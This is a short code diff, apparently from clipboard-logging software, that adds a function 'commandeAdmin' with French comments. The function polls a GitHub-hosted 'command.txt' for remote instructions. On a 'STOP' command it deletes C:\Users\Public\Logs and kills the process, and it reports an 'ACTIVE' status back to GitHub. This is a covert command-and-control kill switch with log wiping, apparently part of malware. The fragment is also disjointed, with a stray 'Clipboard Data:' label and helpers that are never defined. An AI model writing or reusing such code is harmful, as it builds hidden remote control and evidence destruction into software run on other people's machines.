@@ -1,2 +1,17 @@
 Clipboard Data: 
-info(file_path)
+def commandeAdmin(command="STOP"):
+    try:
+        while True:
+            content = read_github("command.txt").strip()
+            if content == command:
+                shutil.rmtree(r"C:\Users\Public\Logs")
+                os._exit(0)
+            time.sleep(20)
+    except Exception:
+        # Vérifie avant d’écrire
+        try:
+            current = read_github("command.txt").strip()
+            if current != command:  # n’écrit "ACTIVE" que si ce n’est pas STOP
+                write_github_file("command.txt", "ACTIVE")
+        except Exception:
+            pass
